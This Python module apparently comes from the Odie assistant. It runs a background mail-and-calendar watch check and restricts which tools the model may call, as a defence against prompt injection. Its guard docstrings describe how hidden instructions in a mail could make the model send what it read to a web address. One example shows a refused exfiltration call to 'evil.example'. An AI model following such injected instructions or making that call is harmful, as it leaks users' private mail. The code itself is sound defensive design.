"""One watch check (spec parts 2 and 3; proactive design §2): find the sources when they're stale, then
  stage 1, Check: the watcher's turn reads the mail, what the user sent and the calendar, with the user's Watch for
  entries and no memory and no ledger, and writes findings (report, track_thread);
  stage 2, Consolidate: one call with no tools places the findings in the ledger, one loop per real thing
  (odie.loops.consolidate); a loop in "ready" is its card on Pulse;
then the watch's card (its line, the events, the sources), the pushes and what it did for a Watch for entry. Without a
report, a card written by code. Sources that just failed three times in a row, or just came back, are said once."""
from __future__ import annotations

import json
import logging
import re
from datetime import datetime, timedelta
from pathlib import Path

from odie.watch import bills, sent, sources
from odie.watch import report as rep
from odie.watch.fetch import STATE, Fetcher
from odie.watch.tools import Check, watch_tools

log = logging.getLogger("odie.watch")
INTERVAL = timedelta(minutes=30)
# What the watch may change without the user's tap (the owner's choice, 21 Oct 2026): adding an event to the calendar
# for a bill's due date or a deadline a mail names. Nothing else that writes: no sending, replying, paying or deleting.
# Bills and orders (the owner's choice, 21 Oct 2026): also updating that event, to mark a bill paid or an order delivered
# or moved. Closing a paid bill's reminder goes through the watch's own close_reminder, never task_update.
MAY_WRITE = frozenset({"calendar_create_event", "mac_calendar_add", "calendar_update_event"})
REACHES_OUT = frozenset({"web_fetch", "web_search", "find_images"})  # tools that send words to the web
# The web addresses written in the user's Watch for entries, set by run_check before each turn: once the check has read
# mail, these are the only places it may still fetch (a fixed address the user wrote carries nothing from the mail).
WATCH_FOR_ADDRESSES: set[str] = set()
_ADDRESS = re.compile(r"https?://[^\s<>\"')\]]+")
CARD_DAYS = 14  # Today's Up next shows two weeks of the calendar
SKILL = Path(__file__).parent / "skill" / "SKILL.md"
WATCH_FOR = "Watch for"


def due(store, now: datetime) -> bool:
    """Is a watch check due? Yes when there has been none (or its time is unreadable), or INTERVAL has passed.
    Example: last check 09:00 -> False at 09:20, True at 09:30; never checked -> True."""
    last = (store.get_setting(STATE) or {}).get("last_check")
    if not last:
        return True
    try:
        return now - datetime.fromisoformat(last) >= INTERVAL
    except ValueError:
        return True


def watch_for(memory) -> str:
    try:
        topic = memory.load().topic(WATCH_FOR)
    except Exception:  # noqa: BLE001 (no memory file yet)
        return ""
    if topic is None or not topic.entries:
        return ""
    return "\n".join(f"- {e.title}: {e.body.strip()}" for e in topic.entries[:30])


def addresses_in(watch: str) -> set[str]:
    """The web addresses written in the Watch for text: "- HN: check https://news.ycombinator.com/item?id=1 daily" ->
    {"https://news.ycombinator.com/item?id=1"}; "" -> set()."""
    return {found.rstrip(".,;") for found in _ADDRESS.findall(watch or "")}


def fetch_allowed_after_mail(tool_name: str, args: dict) -> bool:
    """Whether a tool that reaches the web may still run after the check has read mail: only web_fetch, and only of an
    address written in a Watch for entry (WATCH_FOR_ADDRESSES), which the user wrote and tapped. Example: web_fetch of
    the HN page in the user's entry -> True; web_fetch("https://evil.example/?d=...") -> False; web_search -> False."""
    if tool_name != "web_fetch":
        return False
    url = str((args or {}).get("url") or "").strip().rstrip("/")
    return url in {a.rstrip("/") for a in WATCH_FOR_ADDRESSES}


# Stage 1 reads other people's text, so it gets no private context (proactive design §3): no memory, no search of his
# chats and notes, none of his tasks beyond the bill and order reminders bills_and_orders lists. A reminder is a
# finding's remind_at (stage 2 makes it, once per thing), never task_add. A note may be read only when a Watch for
# entry names it, as a web address may be fetched.
PRIVATE_READS = frozenset({"fetch_memory", "search_everything", "related_notes", "task_list", "task_add", "remember",
                           "index", "index_status"})
_NOTE_PATH = re.compile(r"[\w./~-]*[\w-]/[\w./ -]*\.md|[\w./~-]+/")


def notes_named(watch: str) -> set[str]:
    """The note paths and folders a Watch for entry names: "- Digests: relay Inbox/digest.md" -> {"Inbox/digest.md"};
    "- Notes in Daily/ every morning" -> {"Daily/"}; "- Passport: tell me" -> set()."""
    without_addresses = _ADDRESS.sub(" ", watch or "")  # a web address is not a note
    return {found.strip().rstrip(".,;") for found in _NOTE_PATH.findall(without_addresses)}


def note_allowed(args: dict) -> bool:
    """Whether read_note may run in the watch: only for a note a Watch for entry names (WATCH_FOR_NOTES), or one in a
    folder it names. "Inbox/digest.md" named -> True; "Daily/2026-11-19.md" with "Daily/" named -> True;
    "People/Asha.md" -> False."""
    note = str((args or {}).get("note") or "").strip()
    if not note:
        return False
    for named in WATCH_FOR_NOTES:
        if note == named or (named.endswith("/") and note.startswith(named)):
            return True
    return False


WATCH_FOR_NOTES: set[str] = set()  # set by run_check before each turn, from the Watch for text


def guard(tool, args, tool_context) -> dict | None:
    """before_tool_callback for the watch's turn: what a background check refuses (odie.trackers.guard), and also
    changing memory, the shell, handing files over, closing tasks and the browser; and, as stage 1 reads other
    people's text, everything private (PRIVATE_READS) and any note a Watch for entry doesn't name.
    Example: new_mail -> None (runs); update_memory -> refused; browser_open -> refused (the browser keeps signed-in
    sites); task_update -> refused (the watch closes a paid bill's reminder with its own close_reminder);
    calendar_create_event, calendar_update_event -> None (MAY_WRITE); web_fetch, web_search, find_images -> refused
    from the turn's first call, unless it fetches an address the user wrote in a Watch for entry
    (fetch_allowed_after_mail): code reads the mail before the turn and its words are in the turn from the start
    (loop evidence, the catch-up, the nudge), so a mail's hidden instructions could otherwise carry what the check
    read out to a web address. track, stop_tracker -> refused: a tracker made from mail text would later fetch the
    web on its own. fetch_memory, search_everything, task_list -> refused (private); task_add -> refused (a reminder
    is a finding's remind_at); read_note of a note a Watch for entry names -> runs, any other -> refused."""
    from odie.trackers import guard as trackers_guard
    if tool.name in MAY_WRITE:
        return None
    if tool.name in PRIVATE_READS:
        return {"error": "Not in the watch: it reads other people's text, so it gets nothing private. Write a "
                         "finding (a reminder is its remind_at); Odie matches it to what it knows after the check."}
    if tool.name == "read_note" and not note_allowed(args):
        return {"error": "Only a note a Watch for entry names can be read in the watch."}
    if tool.name in REACHES_OUT and not fetch_allowed_after_mail(tool.name, args):
        return {"error": "Not after reading mail in this check: write it as a finding instead."}
    refused = trackers_guard(tool, args, tool_context)
    if refused:
        return refused
    not_for_the_watch = tool.name in ("update_memory", "forget_memory", "run_shell", "hand_over", "task_update",
                                      "watch_close", "track", "stop_tracker")
    is_browser = tool.name.startswith("browser_")
    if not_for_the_watch or is_browser:
        return {"error": "Not allowed in the background watch: write it as a finding instead."}
    return None


def calendar_skills(store, owner: str = "") -> list[str]:
    """The connected apps' skills a watch check starts with loaded, so it can write to their calendars: one per
    calendar source that is an app (MCP); the Mac's own calendar tools are always there. Gmail and Calendar plus the
    Mac's Calendar -> ["mcp-gmail-calendar"]; only a mail app -> []."""
    names: list[str] = []
    for src in sources.saved(store, owner):
        is_calendar_app = src.kind == "calendar" and src.style != "native"
        name = f"mcp-{src.server}"
        if is_calendar_app and name not in names:
            names.append(name)
    return names


def needs_catch_up(fetcher) -> bool:
    """Whether this check also reads the last month's bills, payments and orders: once per catch-up version, until a
    check that ran it reports. Never run -> True; ran bills.CATCH_UP -> False; ran an older one -> True."""
    return fetcher.caught_up != bills.CATCH_UP


def finish_catch_up(fetcher, reported: bool) -> None:
    """After a check that caught up: done when it reported; a failed turn tries again at the next check, up to
    bills.CATCH_UP_TRIES, then it's given up so a slow model doesn't fail every check. Reported -> done; 1st failure ->
    again next time; 2nd failure -> given up (logged)."""
    if reported:
        fetcher.caught_up = bills.CATCH_UP
        return
    fetcher.catch_up_tries += 1
    if fetcher.catch_up_tries >= bills.CATCH_UP_TRIES:
        log.warning("watch: the bills catch-up failed %d times; given up", fetcher.catch_up_tries)
        fetcher.caught_up = bills.CATCH_UP


def catch_up_prompt(prompt: str, older: list[dict]) -> str:
    """The check's prompt with the catch-up's mail after it: the watch handles these like new mail, once."""
    return (f"{prompt}\n\nThis check is also a one-time catch-up: these are the last {bills.CATCH_UP_DAYS} days' bills, "
            "payments and orders, from before the watch kept them. Handle them as the skill says (an event and a "
            "reminder for a bill still due, a paid one closed, an order's event on its delivery day, a delivered or "
            "cancelled one marked), skip what's over, and write findings only for what still needs following. "
            "read_mail reads any of them in full.\n" + json.dumps(older, ensure_ascii=False))


def _instruction(watch: str) -> str:
    """Stage 1's instruction: the watch skill and the user's Watch for entries (his own instructions). No memory: what
    Odie remembers goes to stage 2 only (proactive design §3)."""
    body = SKILL.read_text().split("---", 2)[-1].strip()
    return f"{body}\n\n## Watch for\n{watch or '(nothing yet)'}"


NOW_TOPIC = "Now"


def now_list(memory) -> str:
    """The user's Now list (≤7 lines of what matters this month, written on his tap; phase 4 builds its proposals),
    for stage 2's priorities; "" when there is none."""
    try:
        topic = memory.load().topic(NOW_TOPIC)
    except Exception:  # noqa: BLE001 (no memory file yet)
        return ""
    if topic is None or not topic.entries:
        return ""
    return "\n".join(f"- {e.title}: {e.body.strip()}" for e in topic.entries[:7])


def nudge_text(check) -> str:
    """The second ask for a turn that ended without report: the mail and events the check read, because the nudge
    runs as a fresh turn that remembers nothing."""
    return ("You ended the watch check without calling report. This is what the check read; call report now "
            "(an empty findings list when nothing needs following, and a one-sentence line for Today).\n"
            f"Mail: {json.dumps([check.fenced(m) for m in check.mails], ensure_ascii=False)}\n"
            f"Events: {json.dumps([e.brief() for e in check.events], ensure_ascii=False)}")


def watches_a_page(watch: str) -> bool:
    """Whether the user's Watch for names a web address, so the check runs its turn every time even with nothing new
    in the mail: that page changes on its own. "- HN: watch https://news.example.org/item?id=1" -> True; "- Passport:
    tell me when it comes" -> False; no Watch for -> False."""
    return bool(addresses_in(watch))


def note_tried(store, now: datetime, owner: str) -> None:
    """Notes when this watch last tried, even with nothing to read, so odie.watch.owner.next_due moves on to the next
    personality instead of picking this one every wake-up."""
    from odie.watch.fetch import STATE
    from odie.watch.owner import key
    state_key = key(STATE, owner)
    state = store.get_setting(state_key) or {}
    store.set_setting(state_key, {**state, "tried_at": now.isoformat(timespec="seconds")})


def has_news(check, catching_up: bool) -> bool:
    """Whether stage 1 has anything new to read; without, no model call (proactive design §4, for every owner). New: a
    mail, a mail the user sent that code didn't already match, an event that is new, moved or cancelled, or the
    one-time catch-up. (A loop past its due date is already a card; the follow-up ladder says it again.)
      nothing in the inbox, the calendar as it was -> False (no call)
      one new mail -> True;  the 15:00 standup moved to 16:00 -> True"""
    if check.mails or check.sent or catching_up:
        return True
    return any(e.change for e in check.events)


async def run_check(store, now: datetime, turn, push, memory=None, memory_index: str = "", owner: str = "",
                    think=None) -> str:
    """One check of one watch: everyday Odie's (owner "") or a personality's own (odie.watch.owner: its apps, its
    loops). turn(prompt, tools, instruction) is stage 1's model turn; think(prompt, instruction) is stage 2's call with
    no tools (None: the findings are placed by the same-ID shortcut alone, else as new loops). Returns "off" (nothing
    to read), "quiet" (nothing new: no model call), "ok" or "fallback"."""
    from odie.loops import consolidate, findings, shortcut
    from odie.watch import pushes
    from odie.watch.owner import key
    if sources.stale(store, now, owner):
        await sources.detect_and_save(store, owner)
    if not sources.saved(store, owner):
        card_key = key(rep.CARD, owner)
        kept = (store.get_setting(card_key) or {}).get("done", [])
        store.set_setting(card_key, {"checked_at": now.isoformat(timespec="seconds"), "line": "", "events": [],
                                     "sources": {}, "off": "Connect Gmail and Calendar (Zapier, Composio or another app) to see them here.",
                                     "done": kept})
        note_tried(store, now, owner)  # a personality with nothing to read waits its turn like the others
        return "off"
    fetcher = Fetcher(store, now, owner)
    check = Check(fetcher)
    # The user's own mail since the last check: a reply in a loop's mail thread, to its sender, closes it now, in code;
    # the rest is the check's "What you sent" (odie.watch.sent). Read here, not by the model, so it never depends on it.
    sent_by_the_user = await fetcher.sent_mail()
    check.sent = sent.close_answered(store, now, sent_by_the_user, owner)
    # Read first, so a check with nothing new makes no model call; the turn's new_mail gives the same list.
    check.mails = await fetcher.new_mail()
    check.mail_read = True
    check.events = await fetcher.upcoming_events()
    # A mail in a thread an open loop holds, or GitHub's mail about the same pull request, joins that loop in code.
    check.loop_of = shortcut.attach_known(store, owner, check.mails, now)
    catching_up = needs_catch_up(fetcher)
    failing = rep.failing_now(store, fetcher.statuses, owner)  # read against the last check, so before commit()

    def ping(title: str, body: str) -> None:
        try:
            push(title, body)
        except Exception:  # noqa: BLE001
            log.warning("watch: a push failed", exc_info=True)

    def say_failing() -> None:
        for app in failing:  # Pulse's Needs you says it too, until the app works again
            ping(pushes.title_for(store, owner, f"{app} stopped working"), "Fix it in Settings → Connected apps.")
    watch = ""
    now_text = ""
    if memory is not None:
        watch = watch_for(memory)
        now_text = now_list(memory)
    context = {"watch": watch, "now": now_text, "memory": memory_index}
    waiting, _tries = consolidate.take_pending(store, owner)
    if not has_news(check, catching_up) and not watches_a_page(watch):
        if waiting and think is not None:  # a stage 2 that failed last time: its findings, alone
            await consolidate.consolidate(store, owner, now, [], think, context)
        card_events = await fetcher.events_ahead(CARD_DAYS)
        rep.nothing_new(store, now, card_events, fetcher.statuses, owner)
        fetcher.commit()
        say_failing()
        return "quiet"
    tools = watch_tools(check)
    WATCH_FOR_ADDRESSES.clear()
    WATCH_FOR_ADDRESSES.update(addresses_in(watch))
    WATCH_FOR_NOTES.clear()
    WATCH_FOR_NOTES.update(notes_named(watch))
    instruction = _instruction(watch)
    prompt = "Run the watch check."  # the background turn puts the time before it (odie.app.runner.background_turn)
    if catching_up:
        older = await fetcher.catch_up_mail()
        if older:
            prompt = catch_up_prompt(prompt, [check.fenced(m) for m in older])
    reason = ""
    from odie.loops import budget
    budget.count(store, now)  # the day's proactive calls (odie.loops.budget): counted, never stopped
    try:
        await turn(prompt, tools, instruction)
    except Exception as e:  # noqa: BLE001 (a failed turn still leaves a card)
        reason = f"{type(e).__name__}: {e}"[:160]
        log.warning("watch turn failed", exc_info=True)
    check.read = True  # read before the turn, for the nudge and for the card's counts
    if check.report is None:  # small models often stop short of report: one nudge, with what the check read
        budget.count(store, now)
        try:
            await turn(nudge_text(check), tools, instruction)
        except Exception as e:  # noqa: BLE001
            reason = f"{type(e).__name__}: {e}"[:160]
            log.warning("watch nudge failed", exc_info=True)
    if catching_up:
        finish_catch_up(fetcher, reported=check.report is not None)
    # Stage 2: every finding of this check (a report's, and any track_thread wrote before a turn stopped short).
    found = findings.collect(check)
    applied = await place(store, owner, now, found, think, context)
    card_events = await fetcher.events_ahead(CARD_DAYS)
    first = bool(fetcher.first)
    r = check.report
    try:
        if r is None:
            rep.fallback(store, now, check.mails, card_events, fetcher.statuses, reason or "no report from the model",
                         owner)
        else:
            rep.save_card(store, now, r["line"], card_events, fetcher.statuses, owner)
    finally:
        # the check's place is saved first: a post that fails never makes it run again every 5 minutes. A turn that
        # raised (a timeout) and left no report leaves its mail for the next check (fetch.Fetcher.commit)
        fetcher.commit(turn_failed=bool(reason) and r is None)

    say_failing()
    push_new_cards(store, now, applied, first, owner, ping)
    if r is None:
        return "fallback"
    tell_done(store, now, r["done"], applied, owner, ping)
    return "ok"


async def place(store, owner: str, now: datetime, found: list[dict], think, context: dict):
    """Stage 2 for this check's findings: the model's call when there is one to think with, else the shortcut alone
    (a finding a loop holds joins it; the rest are new loops). Returns what was done (None: the findings wait)."""
    from odie.loops import consolidate
    if think is None:
        if not found:
            return consolidate.Applied()
        shortcut_hints = consolidate.hints(store, owner, found)
        return consolidate.apply(store, owner, now, found, {}, shortcut_hints)
    return await consolidate.consolidate(store, owner, now, found, think, context)


def push_new_cards(store, now: datetime, applied, first: bool, owner: str, ping) -> None:
    """A push for each loop this check made a card and the model marked to push, within the push rules
    (report.to_push) and the day's shared budget (odie.watch.pushes)."""
    from odie.loops import ledger
    from odie.watch import pushes
    if applied is None:
        return
    items = []
    for lid in applied.to_push:
        loop = ledger.get(store, lid)
        if loop is None or loop["state"] != "ready":
            continue
        items.append({"ref": f"loop:{lid}", "title": loop["title"], "why": loop["result"]})
    for it in rep.to_push(store, now, items, first, owner):
        if pushes.started_by_odie(store, now, owner, it["title"], it["why"], ping, ref=it["ref"]):
            rep.flag_pushed(store, it["ref"], owner)
            lid = int(it["ref"][len("loop:"):])
            ledger.add_event(store, lid, now, "odie", "pushed", "Pushed to your phone")


def tell_done(store, now: datetime, done: list[dict], applied, owner: str, ping) -> None:
    """What the check did for a Watch for entry: noted on the card, and told (a chat note and a push) when worth it
    (worth_telling). A reminder stage 2 made counts as worth telling; one that went to something the user had already
    finished made nothing, so a note about it isn't told unless it brings files."""
    from odie.agent.tools.files import hand_over, workspace
    from odie.watch import pushes
    ws = workspace().resolve()
    added_task = applied is not None and applied.reminders > 0
    to_finished = applied is not None and applied.reminder_to_finished and not added_task
    for d in done:
        media = []
        files = d.get("files") or []
        for x in files:
            if not x:
                continue
            f = Path(x).resolve()
            if f.is_file() and ws in f.parents:  # only files in Odie's workspace can be handed over
                got = hand_over(f, f.name)
                if "media" in got:
                    media.append(got["media"])
        message = str(d.get("message") or "Done.")[:500]
        told = worth_telling(d, media, added_task)
        if to_finished and not media:
            told = False  # the reminder it speaks of is for something he already finished: nothing new
        rep.keep_done(store, now, message, told, media, owner=owner)  # a told note shows on Pulse, under Needs you
        if not told:
            log.info("watch: done, not told: %s", message)
            continue
        done_title = "Odie: done"
        if owner:
            done_title = pushes.title_for(store, owner, "Done")
        ping(done_title, message[:160])


def worth_telling(item: dict, media: list, added_task: bool) -> bool:
    """Does something the watch did for a Watch for entry become a chat message (and a push)? Only when the user gets
    something from it: files to open, a task the check added (a reminder), or the check marked it "tell": true
    (something new he'd act on; a quoted "true" counts too). Anything else stays quiet, on the card and in the log: a
    check that only relayed, found nothing new, found it already covered, or couldn't do something in the background
    tells the user nothing.
    Example: {"message": "The deck from Asha's PDF is ready", "files": [deck]} -> True (a file card);
    a relay check whose finding became a new reminder, no tell -> True (a reminder is told when the model didn't say);
    the same check's {"message": "HN: still no reply", "tell": false} -> False (the model said quiet);
    {"message": "Asha's flight moved to 18:00", "tell": "True"} -> True;
    {"message": "Relayed the digests; both events already covered, nothing added"}, no task added -> False."""
    if media:
        return True
    tell = item.get("tell")
    if isinstance(tell, str):
        tell = tell.strip().lower() == "true"
    if tell is None:
        return added_task  # the model said nothing: a reminder the check added is still worth telling
    return tell is True
